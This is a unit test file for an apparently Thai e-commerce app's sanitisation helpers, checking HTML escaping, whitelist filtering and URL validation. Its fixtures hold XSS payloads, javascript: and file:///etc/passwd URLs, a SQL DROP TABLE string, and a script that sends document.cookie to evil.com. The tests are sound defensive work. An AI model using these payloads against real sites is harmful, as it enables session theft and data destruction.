import { describe, it, expect } from 'vitest';
import { 
  sanitizeText, 
  sanitizeStrict, 
  sanitizeUrl, 
  createSanitizeTransform 
} from '@/lib/sanitize';

/**
 * Comprehensive tests for sanitize.ts
 * 
 * Tests cover:
 * 1. sanitizeText - HTML entity escaping for XSS prevention
 * 2. sanitizeStrict - Whitelist-based filtering for high-security fields
 * 3. sanitizeUrl - URL validation and javascript: prevention
 * 4. createSanitizeTransform - Zod transform integration
 */

// =============================================================================
// sanitizeText TESTS
// =============================================================================
describe('sanitizeText', () => {
  describe('XSS Prevention', () => {
    it('should escape script tags', () => {
      const input = '<script>alert("XSS")</script>';
      const result = sanitizeText(input);
      expect(result).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
      expect(result).not.toContain('<script>');
    });

    it('should escape img onerror attack', () => {
      const input = '<img src="x" onerror="alert(\'XSS\')">';
      const result = sanitizeText(input);
      expect(result).toBe('&lt;img src=&quot;x&quot; onerror=&quot;alert(&#39;XSS&#39;)&quot;&gt;');
      expect(result).not.toContain('<img');
    });

    it('should escape iframe injection', () => {
      const input = '<iframe src="malicious.com"></iframe>';
      const result = sanitizeText(input);
      expect(result).toBe('&lt;iframe src=&quot;malicious.com&quot;&gt;&lt;/iframe&gt;');
      expect(result).not.toContain('<iframe');
    });

    it('should escape onclick handlers', () => {
      const input = '<div onclick="malicious()">Click me</div>';
      const result = sanitizeText(input);
      expect(result).toBe('&lt;div onclick=&quot;malicious()&quot;&gt;Click me&lt;/div&gt;');
    });

    it('should escape template literals for XSS', () => {
      const input = '`${alert("XSS")}`';
      const result = sanitizeText(input);
      expect(result).toContain('&#96;');
    });

    it('should escape SVG XSS vectors', () => {
      const input = '<svg onload="alert(1)">';
      const result = sanitizeText(input);
      expect(result).toBe('&lt;svg onload=&quot;alert(1)&quot;&gt;');
    });
  });

  describe('HTML Entity Escaping', () => {
    it('should escape ampersand first', () => {
      expect(sanitizeText('&')).toBe('&amp;');
    });

    it('should escape less than', () => {
      expect(sanitizeText('<')).toBe('&lt;');
    });

    it('should escape greater than', () => {
      expect(sanitizeText('>')).toBe('&gt;');
    });

    it('should escape double quotes', () => {
      expect(sanitizeText('"')).toBe('&quot;');
    });

    it('should escape single quotes', () => {
      expect(sanitizeText("'")).toBe('&#39;');
    });

    it('should escape backticks', () => {
      expect(sanitizeText('`')).toBe('&#96;');
    });

    it('should escape all special chars in order', () => {
      const input = '<a href="test.html?a=1&b=2">Link</a>';
      const result = sanitizeText(input);
      expect(result).toBe('&lt;a href=&quot;test.html?a=1&amp;b=2&quot;&gt;Link&lt;/a&gt;');
    });
  });

  describe('Normal Input Handling', () => {
    it('should preserve normal text', () => {
      expect(sanitizeText('Hello World')).toBe('Hello World');
    });

    it('should preserve Thai text', () => {
      expect(sanitizeText('สินค้าทดสอบ')).toBe('สินค้าทดสอบ');
    });

    it('should preserve numbers', () => {
      expect(sanitizeText('12345')).toBe('12345');
    });

    it('should preserve spaces and newlines', () => {
      expect(sanitizeText('Line 1\nLine 2')).toBe('Line 1\nLine 2');
    });

    it('should handle empty string', () => {
      expect(sanitizeText('')).toBe('');
    });

    it('should handle mixed content', () => {
      expect(sanitizeText('สินค้า: Product 123')).toBe('สินค้า: Product 123');
    });

    it('should handle product names with prices', () => {
      expect(sanitizeText('iPhone 15 Pro - ฿45,900')).toBe('iPhone 15 Pro - ฿45,900');
    });
  });
});

// =============================================================================
// sanitizeStrict TESTS
// =============================================================================
describe('sanitizeStrict', () => {
  describe('Allowed Characters', () => {
    it('should allow uppercase letters', () => {
      expect(sanitizeStrict('ABCXYZ')).toBe('ABCXYZ');
    });

    it('should allow lowercase letters', () => {
      expect(sanitizeStrict('abcxyz')).toBe('abcxyz');
    });

    it('should allow numbers', () => {
      expect(sanitizeStrict('0123456789')).toBe('0123456789');
    });

    it('should allow Thai characters', () => {
      expect(sanitizeStrict('สินค้า')).toBe('สินค้า');
    });

    it('should allow spaces', () => {
      expect(sanitizeStrict('hello world')).toBe('hello world');
    });

    it('should allow hyphens', () => {
      expect(sanitizeStrict('SKU-001')).toBe('SKU-001');
    });

    it('should allow underscores', () => {
      expect(sanitizeStrict('product_code')).toBe('product_code');
    });

    it('should allow dots', () => {
      expect(sanitizeStrict('file.txt')).toBe('file.txt');
    });

    it('should allow at signs', () => {
      expect(sanitizeStrict('user@example')).toBe('user@example');
    });
  });

  describe('Removed Characters', () => {
    it('should remove HTML tags', () => {
      expect(sanitizeStrict('<script>')).toBe('script');
    });

    it('should remove quotes', () => {
      expect(sanitizeStrict('"test"')).toBe('test');
      expect(sanitizeStrict("'test'")).toBe('test');
    });

    it('should remove special symbols', () => {
      expect(sanitizeStrict('test#$%^&*()')).toBe('test');
    });

    it('should remove backslashes', () => {
      expect(sanitizeStrict('path\\to\\file')).toBe('pathtofile');
    });

    it('should remove forward slashes', () => {
      expect(sanitizeStrict('path/to/file')).toBe('pathtofile');
    });

    it('should remove semicolons and colons (except in allowed)', () => {
      expect(sanitizeStrict('a;b:c')).toBe('abc');
    });

    it('should remove curly braces', () => {
      expect(sanitizeStrict('{test}')).toBe('test');
    });

    it('should remove square brackets', () => {
      expect(sanitizeStrict('[test]')).toBe('test');
    });
  });

  describe('SKU/Code Use Cases', () => {
    it('should handle valid SKU format', () => {
      expect(sanitizeStrict('SKU-2024-001')).toBe('SKU-2024-001');
    });

    it('should handle barcode format', () => {
      expect(sanitizeStrict('8850001234567')).toBe('8850001234567');
    });

    it('should sanitize malicious SKU input', () => {
      expect(sanitizeStrict('SKU<script>alert(1)</script>')).toBe('SKUscriptalert1script');
    });

    it('should handle Thai product codes', () => {
      expect(sanitizeStrict('สินค้า-001')).toBe('สินค้า-001');
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty string', () => {
      expect(sanitizeStrict('')).toBe('');
    });

    it('should handle string with only special chars (except @)', () => {
      // @ is allowed in sanitizeStrict
      expect(sanitizeStrict('!@#$%^&*()')).toBe('@');
    });

    it('should handle mixed allowed and disallowed', () => {
      expect(sanitizeStrict('Test<>123')).toBe('Test123');
    });
  });
});

// =============================================================================
// sanitizeUrl TESTS
// =============================================================================
describe('sanitizeUrl', () => {
  describe('Valid URLs', () => {
    it('should allow https URLs', () => {
      expect(sanitizeUrl('https://example.com')).toBe('https://example.com');
    });

    it('should allow http URLs', () => {
      expect(sanitizeUrl('http://example.com')).toBe('http://example.com');
    });

    it('should allow data image URLs', () => {
      const dataUrl = 'data:image/png;base64,iVBORw0KGgo=';
      expect(sanitizeUrl(dataUrl)).toBe(dataUrl);
    });

    it('should allow URLs with paths', () => {
      expect(sanitizeUrl('https://example.com/path/to/file'))
        .toBe('https://example.com/path/to/file');
    });

    it('should allow URLs with query strings', () => {
      expect(sanitizeUrl('https://example.com?a=1&b=2'))
        .toBe('https://example.com?a=1&b=2');
    });

    it('should trim whitespace from URLs', () => {
      expect(sanitizeUrl('  https://example.com  ')).toBe('https://example.com');
    });
  });

  describe('Invalid URLs', () => {
    it('should reject javascript: URLs', () => {
      expect(sanitizeUrl('javascript:alert(1)')).toBeNull();
    });

    it('should reject javascript: with case variations', () => {
      expect(sanitizeUrl('JavaScript:alert(1)')).toBeNull();
      expect(sanitizeUrl('JAVASCRIPT:alert(1)')).toBeNull();
    });

    it('should reject javascript: embedded in path', () => {
      expect(sanitizeUrl('https://example.com/javascript:alert(1)')).toBeNull();
    });

    it('should reject ftp URLs', () => {
      expect(sanitizeUrl('ftp://example.com')).toBeNull();
    });

    it('should reject file URLs', () => {
      expect(sanitizeUrl('file:///etc/passwd')).toBeNull();
    });

    it('should reject data URLs that are not images', () => {
      expect(sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBeNull();
    });

    it('should reject relative URLs', () => {
      expect(sanitizeUrl('/path/to/file')).toBeNull();
    });

    it('should reject protocol-relative URLs', () => {
      expect(sanitizeUrl('//example.com')).toBeNull();
    });
  });

  describe('Edge Cases', () => {
    it('should return null for empty string', () => {
      expect(sanitizeUrl('')).toBeNull();
    });

    it('should return null for null-like input', () => {
      expect(sanitizeUrl('')).toBeNull();
    });

    it('should handle whitespace-only input', () => {
      expect(sanitizeUrl('   ')).toBeNull();
    });

    it('should allow Supabase storage URLs', () => {
      const supabaseUrl = 'https://xyz.supabase.co/storage/v1/object/public/images/photo.jpg';
      expect(sanitizeUrl(supabaseUrl)).toBe(supabaseUrl);
    });
  });
});

// =============================================================================
// createSanitizeTransform TESTS
// =============================================================================
describe('createSanitizeTransform', () => {
  const transform = createSanitizeTransform();

  it('should sanitize string values', () => {
    expect(transform('<script>')).toBe('&lt;script&gt;');
  });

  it('should preserve null', () => {
    expect(transform(null)).toBeNull();
  });

  it('should preserve undefined', () => {
    expect(transform(undefined)).toBeUndefined();
  });

  it('should handle normal strings', () => {
    expect(transform('Hello World')).toBe('Hello World');
  });

  it('should handle Thai text', () => {
    expect(transform('สินค้าทดสอบ')).toBe('สินค้าทดสอบ');
  });

  it('should be usable as Zod transform', () => {
    // Example of how it would be used in Zod
    const testData = '<script>alert("XSS")</script>';
    const result = transform(testData);
    expect(result).not.toContain('<script>');
  });
});

// =============================================================================
// SECURITY SCENARIOS
// =============================================================================
describe('Security Scenarios', () => {
  it('should prevent stored XSS in product names', () => {
    const maliciousProductName = 'iPhone<script>document.location="evil.com"</script>';
    const sanitized = sanitizeText(maliciousProductName);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).toContain('&lt;script&gt;');
  });

  it('should prevent XSS in customer notes', () => {
    const maliciousNote = 'Customer said: <img src=x onerror=alert(1)>';
    const sanitized = sanitizeText(maliciousNote);
    expect(sanitized).not.toContain('<img');
  });

  it('should prevent SQL-like injection attempts in SKU', () => {
    const maliciousSku = "SKU'; DROP TABLE products;--";
    const sanitized = sanitizeStrict(maliciousSku);
    expect(sanitized).toBe('SKU DROP TABLE products--');
  });

  it('should prevent path traversal in URLs', () => {
    const maliciousUrl = 'file:///etc/passwd';
    expect(sanitizeUrl(maliciousUrl)).toBeNull();
  });

  it('should handle combined attack vectors', () => {
    const combined = '<script>fetch("http://evil.com?c="+document.cookie)</script>';
    const sanitized = sanitizeText(combined);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).toContain('&lt;script&gt;');
  });
});
